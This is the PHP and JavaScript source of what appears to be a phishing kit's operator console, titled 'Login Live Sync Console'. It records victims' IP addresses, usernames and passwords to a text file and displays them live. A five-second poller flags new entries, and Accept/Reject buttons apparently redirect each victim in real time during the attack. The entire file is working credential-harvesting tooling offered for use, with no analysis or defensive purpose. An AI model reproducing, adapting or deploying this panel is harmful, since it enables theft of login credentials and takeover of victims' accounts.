
<?php
session_start();
ini_set('display_errors', 1);


// Check if user has passed OTP verification
if (!isset($_SESSION['otp_verified']) || $_SESSION['otp_verified'] !== true) {
    // Redirect user to login page
    header("Location: login.php");
    exit;
}

error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", -1);

session_write_close();

// Function to get the real IP address of the user
function getRealIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $ip = getRealIpAddress();

    $LG = $ip . "," . $username . "," . $password . "\n";
    file_put_contents("LG.txt", $LG, FILE_APPEND | LOCK_EX);
}

$LG = file_get_contents("LG.txt");
$lines = explode("\n", $LG);
?>
<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <style>
        .button-container {
            display: flex;
            justify-content: space-between;
        }

        .green-button {
            background-color: #065431;
            color: #000;
            padding: 5px 20px;
            margin: 0;
        }
    </style>
    
 <style>
        body {
            background-color: #002b16;
            margin: 0;
            padding: 0;
            display: flex;
            height: 100vh;
        }

        .container {
            display: flex;
            width: 100%;
            height: 100%;
        }

        .image-container,
        .notification-container {
            flex: 1;
            overflow: auto;
            padding: 20px;
        }

        .divider {
            width: 1px;
            background-color: #000;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            background-color: #000;
            box-shadow: 0px 2px 20px #00F752;
            margin-bottom: 20px;
        }

        th,
        td {
            border: 1px solid black;
            padding: 5px;
            text-align: left;
        }

        th {
            background-color: #065431;
            color: #FFFFFF;
        }

        .notification-history {
            background-color: #1f1f1f;
            color: #4f9a75;
            border-radius: 5px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
            transition: box-shadow 0.s;
            max-height: 400px;
        }

        .notification {
            padding: 10px;
            border-bottom: 1px solid #4f9a75;
            display: flex;
            justify-content: space-between;
        }

        .close-button {
            background-color: #006400;
            color: #00F752;
            border: none;
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .close-button:hover {
            background-color: #003300;
        }

        .success-message {
            color: #00ff00;
            font-weight: bold;
        }

        .redirect-button {
            background-color: #006400;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            margin-top: 20px;
        }

        .redirect-button:hover {
            background-color: #003300;
            transform: scale(1.05);
        }
    </style>

	
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
  <script>
        $(document).ready(function () {
            var shownEntries = [];
            var notificationHistory = [];

            function checkForUpdates() {
                console.log('Checking for updates...');
                // Ajax request to check for updates
                $.ajax({
                    type: 'GET',
                    url: 'check_updates.php',
                    success: function (data) {
                        console.log('Update check response:', data);
                        if (data.startsWith('updates_available|')) {
                            // Extract the new content
                            var entries = data.substring('updates_available|'.length).split("\n");

                            // Show a separate notification for each entry
                            entries.forEach(function (entry) {
                                if (entry.trim() !== "" && !shownEntries.includes(entry)) {
                                    showNotification('New data added!', entry);
                                    // Add the entry to the shownEntries array
                                    shownEntries.push(entry);
                                }
                            });
                        }
                    },
                    error: function (xhr, status, error) {
                        console.error('Error during update check:', status, error);
                    }
                });
            }

            // Function to show a popup notification
            function showNotification(message, newData) {
                var notificationContainer = $('#notificationHistory');
                var uniqueId = Date.now(); // Generate a unique identifier using the current timestamp

                var notification = $('<div class="notification" id="notification-' + uniqueId + '">' +
                    '<p>' + message + '</p><p>Data: ' + newData + '</p>' +
                    '<div class="notification-buttons">' +
                    '<button class="show-button" data-new-data="' + newData + '">Show</button>' +
                    '<button class="close-button" data-notification-id="' + uniqueId + '">X</button>' +
                    '</div></div>');

                notificationContainer.prepend(notification);

                // Add the notification to the history
                notificationHistory.push({ id: uniqueId, message: message, data: newData });

                // Attach click event to the "Show" button
                notification.find('.show-button').on('click', function () {
                    var dataToShow = $(this).data('new-data');
                    showDataInTable(dataToShow);
                });

                // Attach click event to the close button
                notification.find('.close-button').on('click', function () {
                    var notificationId = $(this).data('notification-id');
                    // Remove the notification from the history
                    notificationHistory = notificationHistory.filter(function (entry) {
                        return entry.id !== notificationId;
                    });
                    // Remove the notification from the display
                    $('#notification-' + notificationId).remove();
                });
            }

            // Function to show data in a table
            function showDataInTable(data) {
                var table = $('table');
                var dataArray = data.split(',');

                var newRow = $('<tr>');
                dataArray.forEach(function (value) {
                    newRow.append('<td><p style="color:#00FF8D">' + value + '</p></td>');
                });

                newRow.append('<td><form method="post" action="store_link.php" onsubmit="showSuccessMessage(this)">' +
                    '<input type="hidden" name="link" value="../verify login/">' +
                    '<button type="submit">Accept</button>' +
                    '</form></td>');

                newRow.append('<td><form method="post" action="store_link.php" onsubmit="showSuccessMessage(this)">' +
                    '<input type="hidden" name="link" value="auth.php">' +
                    '<button type="submit">Reject</button>' +
                    '</form></td>');

                table.append(newRow);
            }

            // Check for updates every 5 seconds
            setInterval(checkForUpdates, 5000);
        });
    </script>






</head>

<body>
  


    <div class="container">
        <div class="image-container">      <a href="../../dashboard/"><button class="green-button">Goto Dashboard</button></a>
            <table>  <h2><font color="#02FF6A">Login Live Sync Console</font></h2>
                <?php
                $data = file("LG.txt");
                echo "<tr><th>IP</th><th>UserName</th><th>Password</th><th>Actions</th></tr>";
                foreach ($data as $line) {
                    list($ip, $username, $password) = explode(",", $line);
                    echo "<tr>";
                    echo "<td><p style='color:#00FF8D'>" . $ip . "</p></td>";
                    echo "<td><p style='color:#00FF8D'>" . $username . "</p></td>";
                    echo "<td><p style='color:#00FF8D'>" . $password . "</p></td>";
                    echo "<td>
                            <form method='post' action='store_link.php' onsubmit='showSuccessMessage(this)'>
                                <input type='hidden' name='link' value='../verify login/'>
                                <button type='submit'>Accept</button>
                            </form>";
                    echo "<br>"; // Add a line break
                    echo "<form method='post' action='store_link.php' onsubmit='showSuccessMessage(this)'>
                            <input type='hidden' name='link' value='auth.php'>
                            <button type='submit'>Reject</button>
                          </form>
                          </td>";
                    echo "</tr>";
                }
                ?>
            </table>
        </div>

        <div class="divider"></div>

        <div class="notification-container">
            <div class="notification-history" id="notificationHistory">
                <h3>All Entries</h3>
            </div>
        </div>
    </div>
	

  

    <!-- Success message -->
    <div class="success-message" id="successMessage" style="display: none;">Command sent successfully!</div>

    <script>
        function showSuccessMessage(form) {
            var successMessage = document.getElementById('successMessage');
            successMessage.style.display = 'block';
            return false; // Prevent the form from actually submitting
        }

       
    </script>
</body>

</html>
